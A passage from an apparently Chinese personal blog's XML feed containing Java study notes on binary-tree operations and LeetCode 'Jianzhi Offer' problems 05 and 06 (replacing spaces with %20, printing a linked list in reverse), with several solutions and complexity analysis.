class="string">&quot; &quot;</span>); <span class="comment">// 访问</span></span><br><span class="line">node = <span class="literal">null</span>; <span class="comment">// 当前节点的左子树、右子树及本身均已访问,需要访问工作栈中的节点</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据前序、中序遍历结果重建二叉树</span></span><br><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">createBinaryTreeByPreAndIn</span><span class="params">(String pre, String in)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (pre.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">Node&lt;E&gt; root = <span class="keyword">new</span> <span class="title class_">Node</span>(pre.charAt(<span class="number">0</span>));</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> in.indexOf(pre.charAt(<span class="number">0</span>));</span><br><span class="line">root.left = createBinaryTreeByPreAndIn(pre.substring(<span class="number">1</span>, index + <span class="number">1</span>),</span><br><span class="line">in.substring(<span class="number">0</span>, index));</span><br><span class="line">root.right = createBinaryTreeByPreAndIn(</span><br><span class="line">pre.substring(index + <span class="number">1</span>, pre.length()),</span><br><span class="line">in.substring(index + <span class="number">1</span>, in.length()));</span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据中序、后序遍历结果重建二叉树</span></span><br><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">createBinaryTreeByInAndPost</span><span class="params">(String in, String post)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (post.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">Node&lt;E&gt; root = <span class="keyword">new</span> <span class="title class_">Node</span>(post.charAt(post.length() - <span class="number">1</span>));</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> in.indexOf(post.charAt(post.length() - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">root.left = createBinaryTreeByInAndPost(in.substring(<span class="number">0</span>, index),</span><br><span class="line">post.substring(<span class="number">0</span>, index));</span><br><span class="line">root.right = createBinaryTreeByInAndPost(</span><br><span class="line">in.substring(index + <span class="number">1</span>, in.length()),</span><br><span class="line">post.substring(index, post.length() - <span class="number">1</span>));</span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据原树的根结点复制出一颗一模一样的树</span></span><br><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">copy</span><span class="params">(Node&lt;E&gt; root)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">null</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">Node&lt;E&gt; node = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;E&gt;(<span class="literal">null</span>);</span><br><span class="line">node.data = root.data;</span><br><span class="line">node.left = copy(root.left);</span><br><span class="line">node.right = copy(root.right);</span><br><span class="line"><span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法createTreeByPreOrederStr需要用到的指针</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据前序遍历结果重建二叉树，所有的叶子节点都用&quot;#&quot;表示</span></span><br><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">createTreeByPreOrederStr</span><span class="params">(<span class="type">char</span>[] preOrderStr, Node&lt;E&gt; temp)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (index &lt; preOrderStr.length) &#123;</span><br><span class="line"><span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> preOrderStr[index++];</span><br><span class="line"><span class="keyword">if</span> (c != <span class="string">&#x27;#&#x27;</span>) &#123; <span class="comment">// 递归终止条件</span></span><br><span class="line">Node&lt;E&gt; node = <span class="keyword">new</span> <span class="title class_">Node</span>(c);</span><br><span class="line">node.left = createTreeByPreOrederStr(preOrderStr, node); <span class="comment">// 递归为当前节点创建左子树</span></span><br><span class="line">node.right = createTreeByPreOrederStr(preOrderStr, node); <span class="comment">// 递归为当前节点创建右子树</span></span><br><span class="line"><span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取树的根结点</span></span><br><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">getRoot</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得当前结点的左孩子结点</span></span><br><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">getLeftChild</span><span class="params">(Node&lt;E&gt; node)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> node.left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得当前结点的右孩子结点</span></span><br><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">getRightChild</span><span class="params">(Node&lt;E&gt; node)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> node.right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后序遍历的思想：树中节点个数</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">(Node&lt;E&gt; root)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123; <span class="comment">// 递归终止条件</span></span><br><span class="line"><span class="keyword">return</span> size(root.left) + size(root.right) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后序遍历的思想：树的高度(空树为0)</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">height</span><span class="params">(Node&lt;E&gt; root)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123; <span class="comment">// 递归终止条件</span></span><br><span class="line"><span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> height(root.left);</span><br><span class="line"><span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> height(root.right);</span><br><span class="line"><span class="keyword">return</span> h1 &gt; h2 ? h1 + <span class="number">1</span> : h2 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以广义表的形式打印二叉树：前序遍历的应用</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">printBinaryTree</span><span class="params">(Node&lt;E&gt; root)</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123;</span><br><span class="line">sb.append(root.data);</span><br><span class="line"><span class="keyword">if</span> (root.left != <span class="literal">null</span> || root.right != <span class="literal">null</span>) &#123;</span><br><span class="line">sb.append(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">sb.append(printBinaryTree(root.left));</span><br><span class="line">sb.append(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">sb.append(printBinaryTree(root.right));</span><br><span class="line">sb.append(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">return</span> levelOrder();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据树的根结点判断两颗树是否相等</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Node&lt;E&gt; n1, Node&lt;E&gt; n2)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(n1==<span class="literal">null</span> &amp;&amp; n2==<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n1!=<span class="literal">null</span> &amp;&amp; n2!=<span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(n1.data==n2.data)</span><br><span class="line"><span class="keyword">return</span> equals(n1.left, n2.left) &amp;&amp; equals(n1.right, n2.right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>个人学习小结，其中可能有错误，还望在下方评论指出 &#x3D; V &#x3D;</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>递归</tag>
      
      <tag>二叉树</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 05. 替换空格</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2005.%20%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2005.%20%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>请实现一个函数，把字符串 s 中的每个空格替换成”%20”。<br><img src="/upload/2022/02/image-42c8d54a0cb944638cf7226304ee21f6.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个题目考察的是字符串，我之前在剑指Offer书上看到过这题，书上的做法是先遍历一边字符串，再根据空格的个数创建一个长度适宜的字符数组，创建两个指针，一个从字符串的最后面，一个从原字符串的最后面开始遍历，将原字符串最后面的字符依次搬运到新的字符串的最后，当原字符串遇到空格时，则在新字符串数组那里填充上%20三个字符，当两个指针相等的时候遍历结束，新字符串就是要输出的字符串。</p><p>这是我记得的书中所讲的内容，在做这题的时候又开始犯迷糊了，因为当时只是看了一遍树，并没有自己写代码，等到自己来写的时候感觉很不对劲。首先犯迷糊的地方是Java字符串的问题，一开始没想到需要创建一个字符串数组，就想着怎么把这个字符串的长度变大。Java中字符串是不可改变的，所以没办法从这方面下手，只能新建一个字符串，第二个犯迷糊的地方是不知道如何创建一个长度固定的字符串，感觉头晕晕乎乎的，没想到去用字符串数组来实现，所以自己都不知道怎么下手去敲代码，这道题书中的原意是让我们知道填充字符串的时候最好使用从后往前的顺序遍历，因为从前往后会导致移动次数过多，让复杂度变为O（n^2）,而从后往前遍历的复杂度只有O（n）。</p><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p>本来打算直接搬运解答的，但是想想前面分析都已经分析的差不多了，思路也都理清楚了，为什么不自己再试试呢，最后自己还是按照上面的思路实现了这题，但是自己发现和之前的思路有点不一样，我的做法虽然也还是从后往前遍历，但是如果我使用从前往后遍历好像复杂度是一样的。思考了以下，书中是用C++解的，没有字符串，直接用的字符数组，书中直接把原字符数组利用双指针改的，书中这样的好处就是不需要额外的内存消耗，也不需要完全遍历完整个数组，可以提前结束，效率会高一点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">replaceSpace</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] s1 = s.toCharArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (s1[i] == <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                x++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">newlength</span> <span class="operator">=</span> s.length()+x*<span class="number">2</span>;</span><br><span class="line">        <span class="type">char</span>[] s2 = <span class="keyword">new</span> <span class="title class_">char</span>[newlength];</span><br><span class="line">        <span class="type">int</span> <span class="variable">old</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">while</span>(old &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (s1[old-<span class="number">1</span>] == <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                s2[--newlength] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                s2[--newlength] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">                s2[--newlength] = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">                old--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                s2[--newlength] = s1[--old];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(s2);</span><br><span class="line">        <span class="keyword">return</span> s3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看题解发现这题还有很多其他的解法，力扣官方给的题解方法是直接创造一个长度为原数组长度三倍的字符数组，再从头到尾遍历，最后通过String(array, 0, size)创建长度适当的字符串输出。测试了一下这个方法，消耗内存比我上面的少一点，也是，我上面创建了一些没有必要的数组，可以更精简的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">replaceSpace</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">char</span>[] array = <span class="keyword">new</span> <span class="title class_">char</span>[length * <span class="number">3</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                array[size++] = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">                array[size++] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">                array[size++] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                array[size++] = c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(array, <span class="number">0</span>, size);</span><br><span class="line">        <span class="keyword">return</span> newStr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现还有人使用StringBuilder进行解答，这种字符串是可变长度的，所以做起来很方便</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">replaceSpace</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span>(Character c : s.toCharArray())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27; &#x27;</span>) res.append(<span class="string">&quot;%20&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> res.append(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有直接用字符串内置的方法 return s.replace(“ “,”%20”);进行求解的</p>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 06. 从尾到头打印链表</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2006.%20%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2006.%20%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入一个链表的头节点，从尾到头反过来返回每个节点的值（用数组返回）。<br><img src="/upload/2022/02/image-1e82ad8b9cc2480695b497f9eeb1f0c8.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这一题在链表LinkedList那篇文章中有讲过，那篇文章所使用的方法是递归，并且最后是从尾到头打印输出，在做这一题时第一时间想到的解法也是递归，但是递归时遇到了问题，最后要求输出一个整型数组，一时间不知道如何去实现一个长度为链表长度的整型数组并往里面增加元素，甚至还看了题目限制范围后创建了一个长度为10000的整型数组，但是这个整型数组空着的元素并不是null而是0，所以最后输出的依然不符合要求。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="递归法"><a href="#递归法" class="headerlink" title="递归法"></a>递归法</h3><p>这一题题解中有人也是使用的递归的方法，只不过将递归额外使用了一个方法来实现，并且使用ArrayList的add方法存储数据，最后通过循环将ArrayList中的元素转移到整型数组中，代码如下： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; tmp = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] reversePrint(ListNode head) &#123;</span><br><span class="line">        recur(head);</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[tmp.size()];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; res.length; i++)</span><br><span class="line">            res[i] = tmp.get(i);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">recur</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        recur(head.next);</span><br><span class="line">        tmp.add(head.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复杂度分析：<br>时间复杂度 O(N)： 遍历链表，递归 N 次。<br>空间复杂度 O(N)： 系统递归需要使用 O(N)的栈空间。<br>此处额外讲解以下递归算法的时间复杂度和空间复杂度的分析方法：<br><strong>递归算法的时间复杂度</strong>本质上是要看: <strong>递归的次数 * 每次递归中的操作次数</strong><br>上述代码中递归了n次，每次递归执行一次add操作，所以时间复杂度是n<br><strong>递归算法的空间复杂度 &#x3D; 每次递归的空间复杂度 * 递归深度</strong></p><p>虽然递归算法看上去很简单，但是实际上的效率并不是最优的。</p><h3 id="利用栈求解"><a href="#利用栈求解" class="headerlink" title="利用栈求解"></a>利用栈求解</h3><p>这种求解方法是力扣官方给出的解法，栈的特点是后进先出，即最后压入栈的元素最先弹出。考虑到栈的这一特点，使用栈将链表元素顺序倒置。从链表的头节点开始，依次将每个节点压入栈内，然后依次弹出栈内的元素并存储到数组中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] reversePrint(ListNode head) &#123;</span><br><span class="line">        Stack&lt;ListNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;ListNode&gt;();</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (temp != <span class="literal">null</span>) &#123;</span><br><span class="line">            stack.push(temp);</span><br><span class="line">            temp = temp.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> stack.size();</span><br><span class="line">        <span class="type">int</span>[] print = <span class="keyword">new</span> <span class="title class_">int</span>[size];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            print[i] = stack.pop().val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> print;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复杂性分析<br>时间复杂度：O(n)。正向遍历一遍链表，然后从栈弹出全部节点，等于又反向遍历一遍链表。<br>空间复杂度：O(n)。额外使用一个栈存储链表中的每个节点。</p><h3 id="利用数组反向填充求解"><a href="#利用数组反向填充求解" class="headerlink" title="利用数组反向填充求解"></a>利用数组反向填充求解</h3><p>这种方法利用两次循环，第一次得到链表的长度，以此创建等长的数组，第二次遍历链表将链表中前面的数据放到数组的最后面。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] reversePrint(ListNode head) &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">            ++count;</span><br><span class="line">            node = node.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] nums = <span class="keyword">new</span> <span class="title class_">int</span>[count];</span><br><span class="line">        node = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> count - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            nums[i] = node.val;</span><br><span class="line">            node = node.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为需要遍历两遍链表，所以需要额外一个节点ListNode node &#x3D; head;不然的话第一次遍历完链表head会变为空指针，无法进行第二次遍历。这种方法没有使用额外的数据结构也没有用到递归，效率会稍微高一点。<br>复杂性分析<br>时间复杂度：O(n)。两次遍历链表。<br>空间复杂度：O(n)。额外使用一个节点存储链表中的头节点。</p><h3 id="反转链表实现"><a href="#反转链表实现" class="headerlink" title="反转链表实现"></a>反转链表实现</h3><p>这道题的链表是可变的，反转链表的时间复杂度是O(n),空间复杂度是O(1)，因此采用反转链表进行输出的话可以减小空间复杂度。但是这个方法比较适用于输出链表，如果要求用数组的形式输出的话还是需要得到链表的长度，这样一来不如直接使用利用数组反向填充的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">curr</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (curr != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> curr.next;</span><br><span class="line">            curr.next = prev;</span><br><span class="line">            prev = curr;</span><br><span class="line">            curr = next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>个人学习小结，其中可能有错误，还望在下方评论指出 &#x3D; V &#x3D;</p>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 09. 用两个栈实现队列</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2009.%20%E7%94%A8%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2009.%20%E7%94%A8%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/</url>
    
